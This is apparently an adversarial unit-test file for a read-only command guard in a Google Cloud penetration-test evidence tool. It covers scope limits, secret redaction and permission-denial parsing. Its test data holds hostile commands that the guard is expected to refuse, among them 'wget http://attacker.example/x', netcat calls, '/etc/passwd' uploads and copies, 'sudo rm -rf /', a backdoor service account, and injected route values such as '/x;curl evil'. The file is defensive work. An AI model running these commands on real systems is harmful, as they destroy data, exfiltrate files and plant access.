#!/usr/bin/env python3
"""Adversarial tests for the read only guard and the scope logic.

Run: python3 test_guard.py
Every case here is something the tool must refuse, or a scope decision it must
get right. A failure means the guard would let a write or an out of scope
packet through, so these are the tests that matter most.
"""
import os
import sys
import unittest

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
import gcp_assessment_evidence as ev


def refused(text, **kw):
    """True when the guard rejects this command."""
    try:
        ev.guard(ev.C(text, **kw), "test")
        return False
    except ev.GuardError:
        return True


class ReadOnlyGcloud(unittest.TestCase):
    def test_reads_are_allowed(self):
        for text in [
            "gcloud container clusters list --project p",
            "gcloud projects describe augnito-sa-prod-506104 --format=yaml",
            "gcloud projects get-iam-policy augnito-sa-prod-506104 --flatten=bindings",
            "gcloud container get-server-config --location me-central2",
            "gcloud asset search-all-resources --scope=projects/p",
            "gcloud version",
            "gcloud config list",
            "gcloud auth list",
            "gcloud artifacts docker images list me-central2-docker.pkg.dev/p/augnito",
            "gcloud alpha monitoring policies list --project p",
        ]:
            self.assertFalse(refused(text), "should be allowed: " + text)

    def test_writes_are_refused(self):
        for text in [
            "gcloud compute instances delete victim --zone me-central2-a",
            "gcloud container clusters create evil --region me-central2",
            "gcloud projects add-iam-policy-binding p --member=user:me --role=roles/owner",
            "gcloud projects set-iam-policy p policy.json",
            "gcloud sql instances patch ambient-mysql-prod --no-backup",
            "gcloud compute firewall-rules update open --allow=tcp:22",
            "gcloud auth print-access-token",
            "gcloud compute ssh node --zone me-central2-a",
            "gcloud services enable compute.googleapis.com",
            "gcloud iam service-accounts keys create key.json --iam-account=x@y",
            "gcloud container clusters upgrade augnito-sa-gke",
            "gcloud compute instances start victim",
        ]:
            self.assertTrue(refused(text), "should be refused: " + text)

    def test_write_hidden_after_a_read_verb_is_refused(self):
        # The guard looks at every word in the chain, not just the first verb.
        self.assertTrue(refused("gcloud compute instances describe x delete"))

    def test_unknown_verb_is_refused(self):
        self.assertTrue(refused("gcloud compute instances frobnicate"))

    def test_bare_gcloud_is_refused(self):
        self.assertTrue(refused("gcloud"))


class CommandSubstitution(unittest.TestCase):
    """A call inside $( ) or ` ` runs for real and must be checked too."""

    def test_write_inside_dollar_paren_is_refused(self):
        self.assertTrue(refused(
            "echo $(gcloud compute instances delete victim --zone me-central2-a)"))

    def test_write_inside_backticks_is_refused(self):
        self.assertTrue(refused("echo `gcloud projects delete augnito-sa-prod-506104`"))

    def test_write_inside_a_loop_is_refused(self):
        self.assertTrue(refused(
            "for k in $(gcloud iam service-accounts keys create k.json --iam-account=a@b); "
            "do echo $k; done"))

    def test_read_inside_a_loop_is_allowed(self):
        self.assertFalse(refused(
            "for sa in $(gcloud iam service-accounts list --project p --format='value(email)'); "
            "do echo \"$sa\"; done"))

    def test_second_call_on_one_line_is_checked(self):
        self.assertTrue(refused(
            "gcloud compute networks list --project p && gcloud compute networks delete default"))


class ReadOnlyKubectl(unittest.TestCase):
    def test_reads_are_allowed(self):
        for text in [
            "kubectl get pods -A -o wide",
            "kubectl describe node worker-1",
            "kubectl auth can-i --list",
            "kubectl api-resources --api-group=configuration.konghq.com",
            "kubectl cluster-info",
        ]:
            self.assertFalse(refused(text, kube=True), "should be allowed: " + text)

    def test_writes_are_refused(self):
        for text in [
            "kubectl delete pod kong-abc -n kong",
            "kubectl apply -f evil.yaml",
            "kubectl exec -it kong-abc -- sh",
            "kubectl port-forward svc/kong 8001:8001",
            "kubectl create serviceaccount backdoor",
            "kubectl edit deployment kong",
            "kubectl scale deployment kong --replicas=0",
            "kubectl drain node-1",
            "kubectl cp kong-abc:/etc/passwd ./passwd",
            "kubectl run shell --image=busybox",
            "kubectl patch svc kong -p '{}'",
        ]:
            self.assertTrue(refused(text, kube=True), "should be refused: " + text)

    def test_auth_subcommand_is_restricted_to_can_i(self):
        self.assertTrue(refused("kubectl auth reconcile -f rbac.yaml", kube=True))

    def test_secret_values_may_not_be_dumped(self):
        for text in [
            "kubectl get secret db-password -n app -o yaml",
            "kubectl get secrets -A -o json",
            "kubectl get secret db -o jsonpath='{.data.password}'",
            "kubectl get secret db --output=yaml",
        ]:
            self.assertTrue(refused(text, kube=True), "should be refused: " + text)

    def test_secret_inventory_without_values_is_allowed(self):
        self.assertFalse(refused(ev.SECRET_INVENTORY, kube=True))
        self.assertFalse(refused("kubectl get secrets -A", kube=True))


class ShellPrograms(unittest.TestCase):
    def test_dangerous_programs_are_refused(self):
        for text in [
            "rm -rf /tmp/evidence",
            "gcloud compute networks list --project p | tee /tmp/out",
            "sudo gcloud compute networks list --project p",
            "wget http://attacker.example/x",
            "python3 -c 'import os'",
            "nc 8.228.202.254 8001",
            "gsutil cp gs://bucket/secret .",
            "bash -c 'gcloud compute instances delete x'",
        ]:
            self.assertTrue(refused(text), "should be refused: " + text)

    def test_file_redirection_is_refused(self):
        self.assertTrue(refused("gcloud compute networks list --project p > /tmp/out"))

    def test_devnull_redirection_is_allowed(self):
        self.assertFalse(refused("gcloud compute networks list --project p 2>/dev/null"))

    def test_gcloud_group_named_docker_is_not_a_docker_call(self):
        # "gcloud artifacts docker images list" must not read as the docker CLI.
        self.assertFalse(refused(
            "gcloud artifacts docker images list me-central2-docker.pkg.dev/p/augnito"))

    def test_a_quoted_message_does_not_trip_the_blocklist(self):
        # Single quoted text is inert data in shell, so prose is not a program.
        self.assertFalse(refused(
            "kubectl get svc -A --no-headers || echo 'no service with kong in its name'",
            kube=True))

    def test_a_real_program_in_double_quotes_is_still_caught(self):
        # Double quotes still substitute, so they are not treated as inert.
        self.assertTrue(refused('echo "$(sudo rm -rf /)"'))


class InvokedByPath(unittest.TestCase):
    """A program named by its full path is still that program."""

    def test_gcloud_write_by_path_is_refused(self):
        for text in [
            "/usr/bin/gcloud compute instances delete victim",
            "/home/kali/google-cloud-sdk/bin/gcloud projects delete p",
        ]:
            self.assertTrue(refused(text), "should be refused: " + text)

    def test_kubectl_write_by_path_is_refused(self):
        self.assertTrue(refused("/usr/bin/kubectl delete pod kong", kube=True))

    def test_blocked_program_by_path_is_refused(self):
        for text in ["/bin/rm -rf /tmp/evidence", "/bin/sh -c 'gcloud projects delete p'",
                     "/usr/bin/sudo gcloud compute networks list"]:
            self.assertTrue(refused(text), "should be refused: " + text)

    def test_a_path_in_a_real_command_is_not_a_program(self):
        # Paths appear all over the catalogue and must not trip the blocklist.
        self.assertFalse(refused(
            "gcloud artifacts docker images list me-central2-docker.pkg.dev/p/augnito"))
        self.assertFalse(refused(
            "gcloud asset search-all-resources --scope=projects/augnito-sa-prod-506104"))
        self.assertFalse(refused(
            "kubectl get secrets -A --field-selector type!=kubernetes.io/service-account-token",
            kube=True))


class NetworkScope(unittest.TestCase):
    def test_in_scope_targets_are_allowed(self):
        self.assertFalse(refused("nmap -Pn -sT -p 443 8.228.202.254",
                                 net="nmap", target=ev.LB_IP))
        self.assertFalse(refused("curl -sS -i -m 15 https://beta-sa-apis.augnito.ai/",
                                 net="curl", target=ev.HOSTS[0]))

    def test_out_of_scope_host_is_refused(self):
        for text in [
            "nmap -Pn -sT -p 443 1.1.1.1",
            "curl -sS -i -m 15 https://www.google.com/",
            "curl -sS -i -m 15 https://beta-sa-apis.augnito.ai/ https://evil.example.com/",
            "nmap -Pn -sT -p 443 8.228.202.0/24",
        ]:
            self.assertTrue(refused(text, net="nmap" if "nmap" in text else "curl",
                                    target=ev.LB_IP), "should be refused: " + text)

    def test_network_tool_without_a_declared_test_is_refused(self):
        self.assertTrue(refused("nmap -Pn -sT -p 443 8.228.202.254"))
        self.assertTrue(refused("curl -sS https://beta-sa-apis.augnito.ai/"))

    def test_wrong_tool_for_the_declared_test_is_refused(self):
        self.assertTrue(refused("nmap -Pn -p 443 8.228.202.254",
                                net="curl", target=ev.LB_IP))

    def test_a_network_test_must_name_its_host(self):
        self.assertTrue(refused("curl -sS -i -m 15 /tmp/x", net="curl", target=ev.LB_IP))

    def test_curl_may_not_send_a_body(self):
        for text in [
            "curl -sS -i -m 15 -d 'a=1' https://beta-sa-apis.augnito.ai/",
            "curl -sS -i -m 15 --data-binary @x https://beta-sa-apis.augnito.ai/",
            "curl -sS -i -m 15 -T file https://beta-sa-apis.augnito.ai/",
            "curl -sS -i -m 15 -F f=@x https://beta-sa-apis.augnito.ai/",
        ]:
            self.assertTrue(refused(text, net="curl", target=ev.HOSTS[0]),
                            "should be refused: " + text)

    def test_only_safe_methods_are_allowed(self):
        for method in ("POST", "PUT", "DELETE", "PATCH"):
            self.assertTrue(refused(
                "curl -sS -i -m 15 -X %s https://beta-sa-apis.augnito.ai/" % method,
                net="curl", target=ev.HOSTS[0]), method)
        for method in ("GET", "HEAD", "OPTIONS"):
            self.assertFalse(refused(
                "curl -sS -i -m 15 -X %s https://beta-sa-apis.augnito.ai/" % method,
                net="curl", target=ev.HOSTS[0]), method)

    def test_a_path_is_not_mistaken_for_a_host(self):
        # .well-known/security.txt must not read as the host "security.txt".
        self.assertEqual(
            ev.net_hosts("curl -sS https://beta-sa-apps.augnito.ai/.well-known/security.txt"),
            {"beta-sa-apps.augnito.ai"})


class ApplicationLayer(unittest.TestCase):
    """App layer testing is in scope for the three endpoints, and only there."""

    def test_a_body_and_a_write_method_are_allowed(self):
        for text in [
            "curl -sS -i -m 15 -X POST https://beta-sa-apis.augnito.ai/api/v1",
            "curl -sS -i -m 15 -X PUT https://beta-sa-apis.augnito.ai/api/v1",
            "curl -sS -i -m 15 -X PATCH https://beta-sa-apis.augnito.ai/api/v1",
            "curl -sS -i -m 15 -X POST --data '{\"a\":1}' https://beta-sa-apis.augnito.ai/api/v1",
        ]:
            self.assertFalse(refused(text, net="app", target=ev.HOSTS[0]), text)

    def test_delete_stays_a_manual_test(self):
        self.assertTrue(refused(
            "curl -sS -i -m 15 -X DELETE https://beta-sa-apis.augnito.ai/api/v1",
            net="app", target=ev.HOSTS[0]))

    def test_a_method_in_a_variable_is_refused(self):
        # A shell variable would slip past an allowed list of literals.
        self.assertTrue(refused(
            'for m in GET DELETE; do curl -X "$m" https://beta-sa-apis.augnito.ai/; done',
            net="app", target=ev.HOSTS[0]))

    def test_file_upload_is_refused_even_at_the_app_layer(self):
        for flag in ["-T /etc/passwd", "-F f=@/etc/passwd", "--upload-file /etc/passwd"]:
            self.assertTrue(refused(
                "curl -sS %s https://beta-sa-apis.augnito.ai/api/v1" % flag,
                net="app", target=ev.HOSTS[0]), flag)

    def test_a_write_method_is_still_refused_on_a_configuration_read(self):
        self.assertTrue(refused(
            "curl -sS -i -m 15 -X POST https://beta-sa-apis.augnito.ai/",
            net="curl", target=ev.HOSTS[0]))

    def test_an_app_request_to_an_out_of_scope_host_is_refused(self):
        self.assertTrue(refused(
            "curl -sS -i -X POST https://api.augnito.ai/v1", net="app", target=ev.HOSTS[0]))

    def test_a_reserved_origin_is_not_a_host(self):
        # RFC 2606 names can never resolve, so a CORS Origin header is not a target.
        self.assertEqual(ev.net_hosts("curl -H 'Origin: https://attacker.invalid' "
                                      "https://beta-sa-apis.augnito.ai/"),
                         {"beta-sa-apis.augnito.ai"})

    def test_an_unusual_top_level_domain_in_a_url_is_still_caught(self):
        self.assertIn("evil.ru", ev.net_hosts("curl https://evil.ru/x"))
        self.assertTrue(refused("curl -sS https://evil.ru/", net="app", target=ev.HOSTS[0]))


class DynamicTargets(unittest.TestCase):
    """A scan may use an address read out of a scoped resource's own record."""

    def test_an_address_from_the_scoped_resource_is_allowed(self):
        self.assertFalse(refused(
            "nmap -Pn -sT -p 3306 $(gcloud sql instances describe %s --project p "
            "--format='value(ipAddresses.ipAddress)')" % ev.SQL_INSTANCE,
            net="nmap", dynamic=True))

    def test_a_dynamic_target_from_an_unscoped_resource_is_refused(self):
        self.assertTrue(refused(
            "nmap -Pn -sT -p 3306 $(gcloud sql instances describe some-other-db --project p "
            "--format='value(ipAddresses.ipAddress)')", net="nmap", dynamic=True))

    def test_a_dynamic_command_may_not_also_name_a_literal_host(self):
        self.assertTrue(refused(
            "nmap -Pn -sT -p 3306 1.1.1.1 $(gcloud sql instances describe %s --project p "
            "--format='value(ipAddresses.ipAddress)')" % ev.SQL_INSTANCE,
            net="nmap", dynamic=True))

    def test_the_catalogue_dynamic_scans_come_from_scoped_resources(self):
        dynamics = [c for _n, _t, shots in ev.TESTS for s in shots
                    for c in s["cmds"] if c["dynamic"]]
        self.assertTrue(dynamics, "the dynamic scans went missing")
        for cmd in dynamics:
            self.assertTrue(any(("describe %s " % r) in cmd["text"]
                                for r in ev.DYNAMIC_SOURCES), cmd["text"])


class Verdict(unittest.TestCase):
    """An empty read is recorded as a false, per the client's instruction."""

    PROMPT = "\u250c\u2500\u2500(kali@host)-[~]\n\u2514\u2500$ "

    def test_an_empty_iam_policy_leaves_no_evidence(self):
        cmds = [ev.C("gcloud projects get-iam-policy p --format=json")]
        text = self.PROMPT + "gcloud projects get-iam-policy p --format=json\n"
        self.assertEqual(ev.evidence_lines(text, cmds), [])

    def test_a_denial_is_not_evidence(self):
        cmds = [ev.C("gcloud projects get-iam-policy p")]
        text = (self.PROMPT + "gcloud projects get-iam-policy p\n"
                "ERROR: The caller does not have permission\n")
        self.assertEqual(ev.evidence_lines(text, cmds), [])

    def test_a_whole_gcloud_denial_block_counts_for_nothing(self):
        # gcloud answers a refusal with an ERROR line, a help token and a YAML
        # violations section. None of it is evidence.
        cmds = [ev.C("gcloud services list --enabled --project p")]
        text = (self.PROMPT + "gcloud services list --enabled --project p\n"
                "ERROR: (gcloud.services.list) [x] does not have permission to access "
                "projects instance [p]: Permission denied to list services\n"
                "Help Token: Ad9DraAD7xfya_wEe\n"
                "- '@type': type.googleapis.com/google.rpc.PreconditionFailure\n"
                "  violations:\n"
                "  - subject: ?error_code=110002&service=cloudresourcemanager.googleapis.com\n"
                "    type: googleapis.com\n"
                "  reason: AUTH_PERMISSION_DENIED\n")
        self.assertEqual(ev.evidence_lines(text, cmds), [])

    def test_a_denied_command_does_not_hide_a_later_real_result(self):
        cmds = [ev.C("gcloud services list --project p"),
                ev.C("gcloud compute networks list --project p")]
        text = (self.PROMPT + "gcloud services list --project p\n"
                "ERROR: The caller does not have permission\n"
                "  reason: AUTH_PERMISSION_DENIED\n"
                + self.PROMPT + "gcloud compute networks list --project p\n"
                "NAME              SUBNET_MODE\n"
                "augnito-sa-vpc    CUSTOM\n")
        self.assertEqual(ev.evidence_lines(text, cmds),
                         ["NAME              SUBNET_MODE", "augnito-sa-vpc    CUSTOM"])

    def test_a_refusal_is_attributed_to_the_command_that_caused_it(self):
        # A screenshot runs several commands. One refusal must not mark the rest.
        cmds = [ev.C("date"), ev.C("gcloud projects describe p"),
                ev.C("gcloud compute networks list --project p")]
        text = (self.PROMPT + "date\n"
                "Tue Oct 27 02:50:00 IST 2026\n"
                + self.PROMPT + "gcloud projects describe p\n"
                "ERROR: The caller does not have permission\n"
                + self.PROMPT + "gcloud compute networks list --project p\n"
                "augnito-sa-vpc    CUSTOM\n")
        blocks = ev.split_capture(text, cmds)
        self.assertEqual([d for _b, d in blocks], [False, True, False])
        self.assertEqual(len(blocks), len(cmds))

    def test_real_output_is_evidence(self):
        cmds = [ev.C("gcloud compute firewall-rules list --project p")]
        text = (self.PROMPT + "gcloud compute firewall-rules list --project p\n"
                "NAME            NETWORK  SOURCE_RANGES\n"
                "default-allow   vpc      0.0.0.0/0\n")
        self.assertEqual(len(ev.evidence_lines(text, cmds)), 2)


class PerHostRoutes(unittest.TestCase):
    """--app-path may differ per endpoint, because the three publish different
    things: two are APIs and one is a front end."""

    def test_a_bare_path_applies_to_every_endpoint(self):
        self.assertEqual(ev.resolve_app_paths(["/v1/x"], ev.HOSTS),
                         dict.fromkeys(ev.HOSTS, "/v1/x"))

    def test_no_value_leaves_the_default(self):
        self.assertEqual(ev.resolve_app_paths(None, ev.HOSTS),
                         dict.fromkeys(ev.HOSTS, ev.APP_PATH))

    def test_an_endpoint_may_be_named_in_full_by_part_or_by_number(self):
        paths = ev.resolve_app_paths(
            ["1=/transcribe", "ambient=/v1/ambient", "beta-sa-apps.augnito.ai=/"], ev.HOSTS)
        self.assertEqual(paths["beta-sa-apis.augnito.ai"], "/transcribe")
        self.assertEqual(paths["beta-sa-apis-ambient.augnito.ai"], "/v1/ambient")
        self.assertEqual(paths["beta-sa-apps.augnito.ai"], "/")

    def test_a_named_endpoint_beats_a_bare_default(self):
        paths = ev.resolve_app_paths(["/v2/api", "apps=/"], ev.HOSTS)
        self.assertEqual(paths["beta-sa-apis.augnito.ai"], "/v2/api")
        self.assertEqual(paths["beta-sa-apps.augnito.ai"], "/")

    def test_an_ambiguous_endpoint_is_rejected(self):
        # "apis" is inside two of the three names.
        with self.assertRaises(SystemExit):
            ev.resolve_app_paths(["apis=/x"], ev.HOSTS)

    def test_an_unknown_endpoint_is_rejected(self):
        for value in ["nope=/x", "9=/x", "0=/x"]:
            with self.assertRaises(SystemExit):
                ev.resolve_app_paths([value], ev.HOSTS)

    def test_a_route_may_not_carry_shell_metacharacters(self):
        for bad in ["/x;curl evil", "no-leading-slash", "/x$(id)", "/x y", "/x&z",
                    "/x'y", '/x"y', "/x|y", "/x>y"]:
            with self.assertRaises(SystemExit):
                ev.resolve_app_paths([bad], ev.HOSTS)

    def test_real_routes_are_accepted(self):
        for good in ["/", "/v1/transcribe", "/api/v2/ambient-notes", "/a_b.c~d-e", "/x%20y"]:
            self.assertEqual(ev.resolve_app_paths([good], ev.HOSTS)[ev.HOSTS[0]], good)

    def test_route_discovery_keeps_its_word_list(self):
        # /api/v1 is one of the paths test case 43 probes for. Swapping routes
        # must not rewrite the list that is doing the discovering.
        probes = [c for num, _t, shots in ev.TESTS if num == 43
                  for s in shots for c in s["cmds"]]
        self.assertTrue(probes)
        for cmd in probes:
            self.assertIsNone(cmd["route"])
            self.assertIn("'/api/v1'", cmd["text"])

    def test_only_the_app_layer_cases_carry_a_swappable_route(self):
        routed = {num for num, _t, shots in ev.TESTS
                  for s in shots for c in s["cmds"] if c["route"]}
        self.assertTrue(routed <= set(range(44, 49)), routed)
        self.assertEqual(routed, {44, 45, 46, 47, 48})

    def test_every_routed_command_names_the_endpoint_it_targets(self):
        for num, _t, shots in ev.TESTS:
            for shot in shots:
                for cmd in shot["cmds"]:
                    if cmd["route"]:
                        self.assertIn(cmd["target"], ev.HOSTS, "test case %d" % num)
                        self.assertIn("https://%s%s" % (cmd["target"], cmd["route"]),
                                      cmd["text"], "test case %d" % num)


class AccessCoupling(unittest.TestCase):
    """A missing project grant must not cost the tester the phases that never
    call gcloud, since the external and app layer cases are independent of it."""

    @staticmethod
    def needs_gcloud(selected):
        return any("gcloud" in c["text"] for num, _t, shots in ev.TESTS if num in selected
                   for s in shots for c in s["cmds"])

    def test_the_network_only_phases_need_no_project_read(self):
        self.assertFalse(self.needs_gcloud(set(range(35, 39))))
        self.assertFalse(self.needs_gcloud(set(range(43, 49))))
        self.assertFalse(self.needs_gcloud(set(range(35, 39)) | set(range(43, 49))))

    def test_the_gcp_phases_do_need_a_project_read(self):
        for case in (1, 16, 25, 28, 39, 41):
            self.assertTrue(self.needs_gcloud({case}), case)

    def test_route_discovery_runs_on_its_own(self):
        self.assertFalse(self.needs_gcloud({43}))


class ScopeNarrowing(unittest.TestCase):
    """The client took augnito.ai out of scope on 27 Oct 2026."""

    def test_no_command_names_a_host_outside_the_three_endpoints(self):
        allowed = set(ev.SCAN_TARGETS)
        for num, _t, shots in ev.TESTS:
            for shot in shots:
                for cmd in shot["cmds"]:
                    if not cmd["net"]:
                        continue
                    outside = ev.net_hosts(cmd["text"]) - allowed
                    self.assertFalse(outside, "test case %d reaches %s" % (num, outside))

    def test_dns_does_not_dump_a_whole_zone(self):
        self.assertIn("--name=", ev.DNS_LOOP)
        for host in ev.HOSTS:
            self.assertIn(host, ev.DNS_LOOP)

    def test_the_environment_is_recorded_as_uat(self):
        self.assertEqual(ev.ENVIRONMENT, "UAT")


class TargetResolution(unittest.TestCase):
    def test_declared_ip_is_in_scope(self):
        ok, why = ev.resolve_target(ev.LB_IP, {})
        self.assertTrue(ok, why)

    def test_other_ip_is_out_of_scope(self):
        ok, _why = ev.resolve_target("1.1.1.1", {})
        self.assertFalse(ok)

    def test_a_name_pointing_outside_scope_is_refused(self):
        # A hostname is only contacted while it still resolves into scope, so a
        # name re-pointed at a third party is never scanned.
        cache = {}
        ok, why = ev.resolve_target("example.com", cache)
        self.assertFalse(ok)
        self.assertIn("outside the scope", why)

    def test_resolution_is_cached(self):
        cache = {}
        ev.resolve_target(ev.LB_IP, cache)
        self.assertIn(ev.LB_IP, cache)


class Catalogue(unittest.TestCase):
    def test_every_catalogue_command_passes_the_guard(self):
        ev.guard_all()

    def test_test_case_numbers_are_unique_and_titled(self):
        numbers = [n for n, _t, _s in ev.TESTS]
        self.assertEqual(len(numbers), len(set(numbers)))
        for num, title, shots in ev.TESTS:
            self.assertTrue(title.strip(), num)
            self.assertEqual(title, ev.safe_folder(title), "title is not a safe folder name")
            self.assertTrue(shots, "test case %d has no screenshots" % num)
            for shot in shots:
                self.assertTrue(shot["cmds"], "a screenshot with no commands in %d" % num)

    def test_only_selects_the_right_cases(self):
        self.assertEqual(ev.parse_only("2,16,25"), [2, 16, 25])
        self.assertEqual(ev.parse_only("1-4"), [1, 2, 3, 4])
        self.assertEqual(ev.parse_only(None), sorted(n for n, _t, _s in ev.TESTS))

    def test_unknown_case_number_is_rejected(self):
        with self.assertRaises(SystemExit):
            ev.parse_only("999")

    def test_only_the_setup_step_may_write_the_kubeconfig(self):
        setups = [c for _n, _t, shots in ev.TESTS for s in shots
                  for c in s["cmds"] if c["setup"]]
        self.assertEqual(len(setups), 1, "exactly one get-credentials step is expected")
        self.assertTrue(refused(setups[0]["text"]), "get-credentials without setup=True")

    def test_the_app_layer_test_cases_are_exactly_43_to_48(self):
        app_cases = {num for num, _t, shots in ev.TESTS
                     for s in shots for c in s["cmds"] if c["net"] == "app"}
        self.assertEqual(app_cases, set(range(43, 49)))

    def test_the_cluster_test_cases_are_exactly_8_to_15(self):
        # The README tells the tester that 8 to 15 are the ones that need the
        # cluster API, and the preflight skips the probe when none is selected.
        kube_cases = {num for num, _t, shots in ev.TESTS
                      for s in shots for c in s["cmds"] if c["kube"]}
        self.assertEqual(kube_cases, set(range(8, 16)))

    def test_kube_commands_are_marked(self):
        for num, _t, shots in ev.TESTS:
            for shot in shots:
                for cmd in shot["cmds"]:
                    if "kubectl" in cmd["text"]:
                        self.assertTrue(cmd["kube"], "unmarked kubectl command in %d" % num)


class Redaction(unittest.TestCase):
    def test_no_catalogue_command_asks_for_a_secret_value(self):
        for num, _t, shots in ev.TESTS:
            for shot in shots:
                for cmd in shot["cmds"]:
                    text = cmd["text"]
                    if ev.SECRET_DUMP.search(text):
                        self.assertFalse(ev.STRUCTURED_OUT.search(text),
                                         "test case %d could print a secret value" % num)

    def test_denied_output_is_recognised(self):
        for line in [
            "ERROR: (gcloud.container.clusters.list) ResponseError: code=403",
            "Required \"container.clusters.list\" permission(s)",
            "The caller does not have permission",
            "PERMISSION_DENIED",
        ]:
            self.assertTrue(ev.DENIED.search(line), line)

    def test_normal_output_is_not_flagged_as_denied(self):
        self.assertFalse(ev.DENIED.search("NAME  LOCATION  STATUS\naugnito-sa-gke  me-central2  RUNNING"))

    def test_a_number_containing_403_is_not_a_denial(self):
        # A byte count or a port must not mark a screenshot as permission denied.
        for line in ["sizeBytes: 4031234", "tcp:403 allowed", "RULES  4035"]:
            self.assertFalse(ev.DENIED.search(line), line)

    def test_the_real_denial_messages_gcloud_emits_are_recognised(self):
        for line in [
            'ResponseError: code=403, message=Required "container.clusters.list" permission(s)',
            "[x] does not have permission to access projects instance",
            "Permission denied to list services for consumer container",
            "The client is not authorized to make this request",
            "WARNING: Some requests did not succeed. - Required 'compute.instances.list' permission",
        ]:
            self.assertTrue(ev.DENIED.search(line), line)


class Scope(unittest.TestCase):
    def test_scope_constants_match_the_client_document(self):
        self.assertEqual(ev.PROJECT, "augnito-sa-prod-506104")
        self.assertEqual(ev.PROJECT_NUMBER, "871952650502")
        self.assertEqual(ev.REGION, "me-central2")
        self.assertEqual(ev.CLUSTER, "augnito-sa-gke")
        self.assertEqual(ev.SQL_INSTANCE, "ambient-mysql-prod")
        self.assertEqual(ev.AR_REPO, "augnito")
        self.assertEqual(ev.VPC, "augnito-sa-vpc")
        self.assertEqual(ev.SUBNET, "augnito-sa-gke-subnet")
        self.assertEqual(ev.LB_IP, "8.228.202.254")
        self.assertEqual(sorted(ev.HOSTS), sorted([
            "beta-sa-apis.augnito.ai",
            "beta-sa-apis-ambient.augnito.ai",
            "beta-sa-apps.augnito.ai"]))

    def test_every_catalogue_command_targets_the_scoped_project(self):
        for num, _t, shots in ev.TESTS:
            for shot in shots:
                for cmd in shot["cmds"]:
                    text = cmd["text"]
                    if "gcloud" not in text:
                        continue
                    for other in ("augnito-prod", "697202819874", "ap-south-1"):
                        self.assertNotIn(other, text, "test case %d names %s" % (num, other))

    def test_kubeconfig_env_never_points_at_the_users_own_config(self):
        class O:
            project, account, configuration = ev.PROJECT, None, None
            impersonate_service_account = None
            kubeconfig = "/tmp/run-private/kubeconfig"
        env = ev.command_env(O())
        self.assertEqual(env["KUBECONFIG"], "/tmp/run-private/kubeconfig")
        self.assertNotIn(os.path.expanduser("~/.kube/config"), env["KUBECONFIG"])
        self.assertEqual(env["CLOUDSDK_CORE_PROJECT"], ev.PROJECT)
        self.assertEqual(env["CLOUDSDK_CORE_DISABLE_PROMPTS"], "1")

    def test_account_and_impersonation_reach_gcloud(self):
        class O:
            project = ev.PROJECT
            account = "tester@augnito.ai"
            configuration = "augnito-ksa"
            impersonate_service_account = "reader@p.iam.gserviceaccount.com"
            kubeconfig = "/tmp/k"
        env = ev.command_env(O())
        self.assertEqual(env["CLOUDSDK_CORE_ACCOUNT"], "tester@augnito.ai")
        self.assertEqual(env["CLOUDSDK_ACTIVE_CONFIG_NAME"], "augnito-ksa")
        self.assertEqual(env["CLOUDSDK_AUTH_IMPERSONATE_SERVICE_ACCOUNT"],
                         "reader@p.iam.gserviceaccount.com")


if __name__ == "__main__":
    unittest.main(verbosity=2)
